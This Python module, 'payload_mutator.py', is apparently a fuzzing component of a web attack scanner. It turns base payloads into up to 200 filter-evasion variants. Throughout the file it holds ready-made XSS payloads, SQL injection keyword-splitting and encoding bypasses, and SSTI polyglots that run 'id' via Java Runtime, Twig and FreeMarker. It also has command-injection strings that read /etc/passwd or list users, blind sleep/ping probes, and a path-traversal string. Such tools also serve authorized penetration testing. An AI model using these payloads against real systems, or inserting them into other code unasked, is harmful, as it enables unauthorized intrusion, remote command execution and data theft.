"""
payload_mutator.py — Elite Payload Mutation Engine
===================================================
Expands each payload into 50–200 variants using:
- Encoding mutations (URL, HTML, Unicode, Base64, Hex)
- Case mutations (UPPER, lower, MiXeD)
- Whitespace bypass (/**/, TAB, CRLF, +)
- Parser confusion (polyglots, context breakers)
- SQLi-specific bypass (comment injection, string concat, hex encoding)
- XSS-specific bypass (event handler variations, protocol handlers)
- SSTI polyglots (multi-engine coverage)
- Command injection bypass (shell metacharacters)
- Null byte injection
- Encoding chain combinations

Core function: generate_variants(payload) → List[str]
"""

from __future__ import annotations

import base64
import itertools
import random
import re
import string
from typing import Callable, Dict, List, Optional, Set


# ─────────────────────────────────────────────
# Encoding utilities
# ─────────────────────────────────────────────
def _url_encode(s: str, encode_all: bool = False) -> str:
    from urllib.parse import quote
    safe = "" if encode_all else "=&?"
    return quote(s, safe=safe)


def _double_url_encode(s: str) -> str:
    return _url_encode(_url_encode(s, encode_all=True), encode_all=True)


def _html_entity_encode(s: str) -> str:
    """Convert each char to its decimal HTML entity."""
    return "".join(f"&#{ord(c)};" for c in s)


def _html_entity_hex(s: str) -> str:
    """Convert each char to its hex HTML entity."""
    return "".join(f"&#x{ord(c):x};" for c in s)


def _unicode_escape(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" if ord(c) > 127 or ord(c) < 32 else c for c in s)


def _hex_encode(s: str) -> str:
    return "0x" + s.encode("utf-8").hex()


def _base64_payload(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def _null_byte(s: str) -> str:
    return s + "\x00"


def _null_byte_mid(s: str) -> str:
    mid = len(s) // 2
    return s[:mid] + "\x00" + s[mid:]


def _case_upper(s: str) -> str:
    return s.upper()


def _case_lower(s: str) -> str:
    return s.lower()


def _case_alternating(s: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))


def _case_random(s: str) -> str:
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def _whitespace_tab(s: str) -> str:
    return s.replace(" ", "\t")


def _whitespace_newline(s: str) -> str:
    return s.replace(" ", "\n")


def _whitespace_cr(s: str) -> str:
    return s.replace(" ", "\r")


def _whitespace_comment(s: str) -> str:
    return s.replace(" ", "/**/")


def _whitespace_plus(s: str) -> str:
    return s.replace(" ", "+")


def _whitespace_url_encoded(s: str) -> str:
    return s.replace(" ", "%20")


def _whitespace_double_encoded(s: str) -> str:
    return s.replace(" ", "%2520")


# ─────────────────────────────────────────────
# SQL-specific mutations
# ─────────────────────────────────────────────
_SQL_KEYWORDS = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE",
                 "AND", "OR", "NOT", "NULL", "ORDER", "GROUP", "BY", "HAVING",
                 "JOIN", "INNER", "OUTER", "LEFT", "RIGHT", "DROP", "TABLE",
                 "CREATE", "EXEC", "EXECUTE", "CAST", "CONVERT", "SLEEP", "WAITFOR",
                 "BENCHMARK", "IF", "CASE", "THEN", "ELSE", "END", "LIMIT", "OFFSET"]


def _sql_comment_bypass(s: str) -> str:
    """INSERT /**/ between SQL keywords: SELECT → SE/**/LECT"""
    result = s
    for kw in _SQL_KEYWORDS:
        if kw in result.upper():
            mid = len(kw) // 2
            result = re.sub(
                kw, kw[:mid] + "/**/" + kw[mid:], result, flags=re.I, count=1
            )
    return result


def _sql_double_comment(s: str) -> str:
    return s.replace(" ", "/*!*/")


def _sql_inline_comment(s: str) -> str:
    return s.replace(" ", "-- \n")


def _sql_concat_string(s: str) -> str:
    """Replace string literals with CONCAT calls."""
    return re.sub(
        r"'([^']+)'",
        lambda m: "CONCAT(" + ",".join(f"'{c}'" for c in m.group(1)) + ")",
        s,
    )


def _sql_hex_string(s: str) -> str:
    """Convert string literals to hex: 'admin' → 0x61646d696e"""
    return re.sub(
        r"'([^']+)'",
        lambda m: _hex_encode(m.group(1)),
        s,
    )


def _sql_char_fn(s: str) -> str:
    """Replace string literals with CHAR(): 'a' → CHAR(97)"""
    return re.sub(
        r"'([^']+)'",
        lambda m: "CHAR(" + ",".join(str(ord(c)) for c in m.group(1)) + ")",
        s,
    )


def _sql_scientific_int(s: str) -> str:
    """Replace numeric literals with scientific notation: 1 → 1e0"""
    return re.sub(r"\b(\d+)\b", r"\1e0", s)


# ─────────────────────────────────────────────
# XSS-specific mutations
# ─────────────────────────────────────────────
_XSS_TAG_VARIANTS = [
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script >alert(1)</script>",
    "<script\t>alert(1)</script>",
    "<%2fscript%3e%3cscript%3ealert(1)",
    "<svg onload=alert(1)>",
    "<SVG ONLOAD=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<IMG SRC=x ONERROR=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<form><button formaction=javascript:alert(1)>click",
    "<math><mi xlink:href=javascript:alert(1)>CLICK</mi></math>",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "<input autofocus onfocus=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "<!--<script>alert(1)//-->",
]

_XSS_ENCODING_VARIANTS = [
    # Protocol bypasses
    "jaVasCript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "java\nscript:alert(1)",
    "java\tscript:alert(1)",
    "java&#10;script:alert(1)",
    "java&#x09;script:alert(1)",
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)",
    # Evaluation bypasses
    "eval('ale'+'rt(1)')",
    "eval(atob('YWxlcnQoMSk='))",
    "Function('alert(1)')()",
    "(new Function`alert\`1\``)()",
    "setTimeout(alert,0,1)",
    "setInterval`alert\`1\``,0",
    # Backtick template literal
    "alert`1`",
    "alert`${1}`",
    "[].constructor.constructor`alert\`1\``()",
    # SVG quirks
    "<svg><script>alert&#40;1&#41;</script>",
    "<svg><script>alert&lpar;1&rpar;</script>",
]


def _xss_randomize_case(payload: str) -> str:
    """Randomize case of HTML tags."""
    return re.sub(
        r"</?([a-zA-Z]+)",
        lambda m: "<" + "".join(
            c.upper() if random.random() > 0.5 else c.lower() for c in m.group(1)
        ),
        payload,
    )


def _xss_encode_alert(payload: str) -> str:
    """Encode alert() in various ways."""
    replacements = [
        ("alert(1)", "eval('ale'+'rt(1)')"),
        ("alert(1)", "alert`1`"),
        ("alert(1)", "window['ale'+'rt'](1)"),
        ("alert(1)", "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"),
        ("alert(1)", "[]['constructor']['constructor']('alert(1)')()"),
    ]
    for old, new in replacements:
        if old in payload:
            return payload.replace(old, new)
    return payload


# ─────────────────────────────────────────────
# SSTI polyglots
# ─────────────────────────────────────────────
_SSTI_POLYGLOTS = [
    "{{7*7}}${7*7}<%=7*7%>#{7*7}*{7*7}",
    "${7*7}",
    "{{7*7}}",
    "#{7*7}",
    "*{7*7}",
    "<%=7*7%>",
    "${7777777+0}",
    "{{config}}",
    "{{''.__class__}}",
    "${''.__class__}",
    "{{''.class.mro}}",
    "{{range.class.forName('java.lang.Runtime').exec('id')}}",
    "{{_self.env.displayVar('id')}}",
    "{{['id']|filter('system')}}",
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    "#set($x='')##{''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
    "@(1+1)",  # Razor
]


# ─────────────────────────────────────────────
# Command injection mutations
# ─────────────────────────────────────────────
_CMDI_BASE = [
    "id", "whoami", "uname -a", "cat /etc/passwd",
    "ls /", "dir", "net user", "ipconfig",
]

_CMDI_SEPARATORS = [
    ";", "&&", "||", "|", "\n", "\r\n", "&",
    ";id;", "$(id)", "`id`", "${IFS}id",
    "%0aid", "%0did", "%3bid",
]

_CMDI_BLIND = [
    "ping -c 1 127.0.0.1",
    "sleep 5",
    "ping -n 1 127.0.0.1",
    "timeout 5",
    "| sleep 5",
    "; sleep 5",
    "&& sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    "${IFS}sleep${IFS}5",
]

# ─────────────────────────────────────────────
# Polyglot mutations
# ─────────────────────────────────────────────
_POLYGLOTS = [
    # XSS + SQLi
    "';alert(1)--",
    "\";<script>alert(1)</script>",
    "1\"'><img src=x onerror=alert(1)>-- -",
    # XSS + LFI
    "../../etc/passwd\";<script>alert(1)</script>",
    # XSS + SSTI
    "{{7*7}}<script>alert(1)</script>",
    # Universal polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # Multi-parser
    "--><img src=x onerror=alert(1)><!-- ';--><img src=x onerror=alert(1)><!--",
    # HTML5 polyglot
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>",
]


# ─────────────────────────────────────────────
# Core mutation engine
# ─────────────────────────────────────────────
class PayloadMutator:
    """
    Enterprise payload mutation engine.

    Given any base payload, generates 50–200 context-specific variants.
    Variants cover encoding, case, whitespace, parser confusion, and polyglots.
    """

    MAX_VARIANTS: int = 200

    def __init__(self, deduplicate: bool = True):
        self._dedup = deduplicate

    def generate_variants(
        self,
        payload: str,
        mutation_types: Optional[List[str]] = None,
    ) -> List[str]:
        """
        Generate 50–200 payload variants.

        mutation_types: subset of ['encoding', 'case', 'whitespace', 'sql', 'xss', 'polyglot', 'null']
        If None, applies all applicable mutations.
        """
        if mutation_types is None:
            mutation_types = ["encoding", "case", "whitespace", "sql", "xss", "polyglot", "null", "chained"]

        seen: Set[str] = {payload}
        variants: List[str] = [payload]  # Original is always first

        # ── 1. Encoding mutations
        if "encoding" in mutation_types:
            encoders: List[Callable[[str], str]] = [
                _url_encode,
                _double_url_encode,
                _html_entity_encode,
                _html_entity_hex,
                _unicode_escape,
            ]
            for enc in encoders:
                v = enc(payload)
                if v != payload:
                    self._add(variants, seen, v)

        # ── 2. Case mutations
        if "case" in mutation_types:
            for fn in [_case_upper, _case_lower, _case_alternating, _case_random, _case_random]:
                v = fn(payload)
                self._add(variants, seen, v)

        # ── 3. Whitespace bypass
        if "whitespace" in mutation_types:
            ws_fns = [
                _whitespace_tab, _whitespace_newline, _whitespace_cr,
                _whitespace_comment, _whitespace_plus,
                _whitespace_url_encoded, _whitespace_double_encoded,
            ]
            for fn in ws_fns:
                v = fn(payload)
                self._add(variants, seen, v)

        # ── 4. SQL-specific
        if "sql" in mutation_types and self._looks_sql(payload):
            sql_fns = [
                _sql_comment_bypass, _sql_double_comment, _sql_inline_comment,
                _sql_concat_string, _sql_hex_string, _sql_char_fn, _sql_scientific_int,
            ]
            for fn in sql_fns:
                try:
                    v = fn(payload)
                    self._add(variants, seen, v)
                except Exception:
                    pass
            # Combine: case + whitespace bypass
            for fn in [_sql_comment_bypass, _sql_hex_string]:
                try:
                    v = _case_upper(fn(payload))
                    self._add(variants, seen, v)
                    v = _case_alternating(fn(payload))
                    self._add(variants, seen, v)
                except Exception:
                    pass

        # ── 5. XSS-specific
        if "xss" in mutation_types and self._looks_xss(payload):
            for xss_v in _XSS_TAG_VARIANTS:
                self._add(variants, seen, xss_v)
            for xss_v in _XSS_ENCODING_VARIANTS:
                self._add(variants, seen, xss_v)
            self._add(variants, seen, _xss_randomize_case(payload))
            self._add(variants, seen, _xss_encode_alert(payload))
            # Apply encodings to XSS payloads
            base_xss = _XSS_TAG_VARIANTS[:5]
            for xss_base in base_xss:
                self._add(variants, seen, _url_encode(xss_base))
                self._add(variants, seen, _html_entity_encode(xss_base))

        # ── 6. SSTI polyglots
        if "ssti" in mutation_types or "polyglot" in mutation_types:
            for poly in _SSTI_POLYGLOTS:
                self._add(variants, seen, poly)

        # ── 7. Polyglots
        if "polyglot" in mutation_types:
            for poly in _POLYGLOTS:
                self._add(variants, seen, poly)

        # ── 8. Null byte injection
        if "null" in mutation_types:
            self._add(variants, seen, _null_byte(payload))
            self._add(variants, seen, _null_byte_mid(payload))
            self._add(variants, seen, _url_encode(_null_byte(payload)))

        # ── 9. Chained mutations (encoding + case, whitespace + encoding)
        if "chained" in mutation_types:
            chain_pairs = [
                (_url_encode, _case_upper),
                (_case_alternating, _whitespace_comment),
                (_whitespace_tab, _url_encode),
                (_case_upper, _whitespace_comment),
                (_html_entity_encode, _case_upper),
            ]
            for fn1, fn2 in chain_pairs:
                try:
                    v = fn2(fn1(payload))
                    self._add(variants, seen, v)
                except Exception:
                    pass

        # ── 10. CMDI mutations (if command injection payload)
        if "cmdi" in mutation_types or (any(cmd in payload.lower() for cmd in ["id", "sleep", "ping", "cat"])):
            for sep in _CMDI_SEPARATORS[:5]:
                self._add(variants, seen, f"{payload}{sep}id")
            for blind in _CMDI_BLIND[:5]:
                self._add(variants, seen, payload + ";" + blind)

        # Enforce max
        return variants[:self.MAX_VARIANTS]

    def generate_sqli_variants(self, base_payload: str) -> List[str]:
        """Specialized SQLi payload expansion."""
        return self.generate_variants(base_payload, mutation_types=["encoding", "case", "whitespace", "sql", "null", "chained"])

    def generate_xss_variants(self, base_payload: str) -> List[str]:
        """Specialized XSS payload expansion."""
        return self.generate_variants(base_payload, mutation_types=["encoding", "case", "whitespace", "xss", "polyglot", "null"])

    def generate_ssti_variants(self, base_payload: str) -> List[str]:
        """Specialized SSTI payload expansion."""
        return self.generate_variants(base_payload, mutation_types=["encoding", "case", "ssti", "polyglot"])

    def generate_cmdi_variants(self, base_payload: str) -> List[str]:
        """Specialized command injection payload expansion."""
        variants: List[str] = []
        seen: Set[str] = set()
        for sep in _CMDI_SEPARATORS:
            for cmd in _CMDI_BASE:
                self._add(variants, seen, f"{base_payload}{sep}{cmd}")
        for blind in _CMDI_BLIND:
            self._add(variants, seen, f"{base_payload};{blind}")
        # Encoding
        for v in list(variants[:20]):
            self._add(variants, seen, _url_encode(v))
            self._add(variants, seen, _double_url_encode(v))
        return variants[:self.MAX_VARIANTS]

    # ── Helpers ──────────────────────────────────────────────────
    def _add(self, variants: List[str], seen: Set[str], v: str) -> None:
        if v and v not in seen and len(variants) < self.MAX_VARIANTS:
            seen.add(v)
            variants.append(v)

    @staticmethod
    def _looks_sql(payload: str) -> bool:
        sql_keywords = ["select", "union", "insert", "update", "delete", "drop",
                       "sleep", "waitfor", "exec", "cast", "convert", "where", "from"]
        p_lower = payload.lower()
        return any(kw in p_lower for kw in sql_keywords) or "'" in payload or "--" in payload

    @staticmethod
    def _looks_xss(payload: str) -> bool:
        return any(c in payload for c in ["<", ">", "alert", "script", "onerror", "onload", "javascript:"])


# ─────────────────────────────────────────────
# Quick API
# ─────────────────────────────────────────────
_default_mutator = PayloadMutator()


def generate_variants(payload: str, mutation_types: Optional[List[str]] = None) -> List[str]:
    """
    Generate 50-200 payload variants from a base payload.
    This is the primary public API for the mutation engine.
    """
    return _default_mutator.generate_variants(payload, mutation_types=mutation_types)


def generate_sqli_variants(payload: str) -> List[str]:
    return _default_mutator.generate_sqli_variants(payload)


def generate_xss_variants(payload: str) -> List[str]:
    return _default_mutator.generate_xss_variants(payload)


def generate_ssti_variants(payload: str) -> List[str]:
    return _default_mutator.generate_ssti_variants(payload)


def generate_cmdi_variants(payload: str) -> List[str]:
    return _default_mutator.generate_cmdi_variants(payload)
